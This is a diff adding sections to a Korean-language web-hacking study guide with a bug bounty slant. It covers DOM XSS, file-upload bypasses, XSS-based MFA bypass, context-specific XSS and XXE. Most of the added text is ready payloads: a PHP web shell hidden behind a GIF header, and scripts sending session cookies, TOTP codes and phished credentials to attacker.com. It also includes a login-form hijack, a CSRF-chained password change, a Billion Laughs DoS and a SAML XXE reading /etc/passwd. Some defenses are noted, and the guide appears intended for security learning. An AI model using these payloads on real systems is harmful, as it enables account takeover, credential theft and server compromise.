@@ -325,6 +325,64 @@ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
 
 ---
 
+### 3-5. DOM 기반 XSS 소스와 싱크 (Sources & Sinks)
+
+```
+소스 (Source) — 공격자 입력이 들어오는 지점:
+  document.URL
+  document.location.href
+  document.location.search
+  document.location.hash
+  document.referrer
+  window.name
+  postMessage 이벤트 데이터
+
+싱크 (Sink) — 실행으로 이어지는 위험 함수:
+  innerHTML, outerHTML        → HTML 삽입 → XSS
+  document.write()            → HTML 삽입 → XSS
+  eval()                      → JS 실행
+  setTimeout(문자열)          → JS 실행
+  setInterval(문자열)         → JS 실행
+  location.href = 사용자입력  → javascript: 프로토콜
+  jQuery.html()               → innerHTML과 동일
+
+DOM XSS 탐지 (Polyglot 페이로드):
+  javascript:/*--></title></style></textarea></script></xmp>
+  <svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+방어:
+  - textContent / innerText 사용 (innerHTML 대신)
+  - DOMPurify 라이브러리로 HTML 살균 (sanitize)
+  - Trusted Types API (Chrome 75+) 적용
+```
+
+### 3-6. 파일 업로드 취약점 — 버그바운티 관점 추가 기법
+
+```
+Content-Type 우회 (Burp Suite Intercept 사용):
+  1. .php 파일 선택
+  2. 요청 가로채기 → Content-Type: image/jpeg 로 변조
+  3. 서버가 Content-Type만 검증 시 우회
+
+이중 확장자 공격:
+  shell.php.jpg  → Apache mod_mime 취약 설정 시 PHP로 처리
+  shell.jpg.php  → 마지막 확장자를 실행 확장자로 처리
+
+IIS 취약점:
+  shell.asp;.jpg → IIS 6 취약 버전에서 ASP로 처리
+
+파일 시그니처 조작 (Magic Bytes):
+  GIF89a<?php system($_GET['cmd']); ?>
+  → 파일 헤더는 GIF, 뒤에 PHP 코드 삽입
+  → 이미지 검증 라이브러리를 우회
+
+업로드 후 실행 경로 탐색:
+  ffuf -u http://target.com/uploads/FUZZ -w wordlist.txt
+  gobuster dir -u http://target.com -w dirs.txt -x php
+```
+
+---
+
 ## 4. 기타 주요 웹 취약점
 
 ### 4-1. Directory Traversal (경로 탐색)
@@ -500,4 +558,188 @@ csrf = CSRFProtect(app)
 
 # SameSite 쿠키로 CSRF 방어
 Set-Cookie: session=abc; SameSite=Strict
+```
+
+---
+
+## 7. XSS를 이용한 MFA 우회
+
+### 원리
+```
+MFA (2단계 인증)가 설정된 계정도 XSS로 우회 가능
+→ XSS가 피해자 브라우저에서 실행되므로 세션이 이미 인증된 상태
+
+공격 흐름:
+1. 피해자가 MFA를 완료하고 로그인 성공
+2. 저장형 XSS 페이로드가 피해자 브라우저에서 실행
+3. 이미 인증된 세션(쿠키)을 공격자에게 전송
+4. 공격자가 세션 쿠키로 직접 접근 (MFA 단계 건너뜀)
+```
+
+### MFA 우회 XSS 시나리오
+```javascript
+// 시나리오 1: 세션 쿠키 탈취 (HttpOnly 없을 때)
+<script>
+  fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>
+
+// 시나리오 2: TOTP 코드 자동 캡처 (입력 폼이 있는 경우)
+<script>
+  document.getElementById('totp-input').addEventListener('input', function(e) {
+    fetch('https://attacker.com/totp?code=' + e.target.value);
+  });
+</script>
+
+// 시나리오 3: 가짜 MFA 팝업으로 피싱
+<script>
+  var overlay = document.createElement('div');
+  overlay.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999">
+      <div style="background:white;margin:20% auto;padding:30px;width:300px;text-align:center">
+        <h3>보안 인증</h3>
+        <p>OTP 코드를 입력하세요</p>
+        <input id="fake-otp" type="text">
+        <button onclick="steal()">확인</button>
+      </div>
+    </div>`;
+  document.body.appendChild(overlay);
+  
+  function steal() {
+    var code = document.getElementById('fake-otp').value;
+    fetch('https://attacker.com/mfa?code=' + code);
+  }
+</script>
+
+// 시나리오 4: 비밀번호 변경 (CSRF + XSS 연계)
+<script>
+  // XSS로 CSRF 토큰 획득 후 비밀번호 변경
+  fetch('/account/settings')
+    .then(r => r.text())
+    .then(html => {
+      var token = html.match(/csrf_token.*?value="([^"]+)"/)[1];
+      return fetch('/account/change-password', {
+        method: 'POST',
+        body: 'csrf_token=' + token + '&new_password=hacked123',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
+      });
+    });
+</script>
+```
+
+---
+
+## 8. 컨텍스트별 XSS 인코딩 전략
+
+### 삽입 위치에 따른 공격 방법
+```html
+<!-- 1. HTML 요소 컨텍스트 -->
+<div>사용자입력</div>
+공격: <script>alert(1)</script>
+방어: HTML 엔티티 인코딩 (&lt; &gt; &amp;)
+
+<!-- 2. HTML 속성 컨텍스트 -->
+<input value="사용자입력">
+공격: " onmouseover="alert(1)
+방어: 속성값 따옴표 필수 + " → &quot; 인코딩
+
+<!-- 3. JavaScript 컨텍스트 -->
+<script>var x = '사용자입력'</script>
+공격: '; alert(1); var y='
+방어: JSON.stringify() + ' → \x27
+
+<!-- 4. URL 컨텍스트 -->
+<a href="사용자입력">
+공격: javascript:alert(1)
+방어: URL 스킴 화이트리스트 (http/https만 허용)
+
+<!-- 5. CSS 컨텍스트 -->
+<div style="color: 사용자입력">
+공격: expression(alert(1))  (IE), url('javascript:...')
+방어: CSS 파서 통한 값 검증
+
+<!-- 6. JSON 응답에서 -->
+{"message": "사용자입력"}
+→ HTML 렌더링 시 DOM XSS 가능
+방어: JSON response에도 HTML 인코딩
+```
+
+### 트로이 목마 로그인 패널 (Login Defacement)
+```javascript
+// 실제 로그인 폼을 공격자 서버로 제출하도록 변조
+<script>
+  // 정상 폼의 action 속성 변경
+  var loginForm = document.querySelector('form[action*="login"]');
+  if (loginForm) {
+    loginForm.action = 'https://attacker.com/capture';
+  }
+  
+  // 또는 전체 페이지 교체
+  document.body.innerHTML = `
+    <form method="POST" action="https://attacker.com/steal">
+      <input name="username" placeholder="아이디">
+      <input name="password" type="password" placeholder="비밀번호">
+      <button>로그인</button>
+    </form>`;
+</script>
+```
+
+---
+
+## 9. XXE 심화 (Billion Laughs + SAML 공격)
+
+### Billion Laughs DoS 변형
+```xml
+<!-- 지수적 확장 공격 -->
+<?xml version="1.0"?>
+<!DOCTYPE billion [
+  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">  <!-- 수백 바이트 -->
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">   <!-- 10배 -->
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">   <!-- 100배 -->
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">   <!-- 1000배 -->
+  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">   <!-- 10000배 -->
+]>
+<data>&e;</data>
+<!-- 파서가 &e; 확장 시 수 GB 메모리 소비 → OOM 또는 CPU 100% -->
+```
+
+### SAML XXE — SSO 공격
+```
+SAML(Security Assertion Markup Language):
+엔터프라이즈 SSO에 사용되는 XML 기반 인증 프로토콜
+
+공격 흐름:
+1. SP(Service Provider)에서 IdP로 인증 요청
+2. IdP가 SAML Response (XML) 발행
+3. SP로 SAML Response 전달 (Base64 인코딩)
+4. ↑ 이 단계에서 중간자 공격 또는 클라이언트 측 변조
+
+취약 시나리오:
+```
+```bash
+# SAML Response 캡처 (Burp Suite)
+# SAMLResponse= 파라미터 값 추출
+
+# Base64 디코딩
+echo "SAMLResponse값" | base64 -d > saml.xml
+
+# XXE 페이로드 삽입
+# <samlp:Response ...> 앞에 DOCTYPE 선언 추가
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+# 다시 Base64 인코딩
+cat saml_modified.xml | base64 -w0
+
+# 변조된 SAMLResponse 전송 → 서버가 /etc/passwd를 SAML 처리 중 읽음
+```
+
+```xml
+<!-- 변조된 SAML Response -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Issuer>&xxe;</saml:Issuer>
+  ...
+</samlp:Response>
 ```
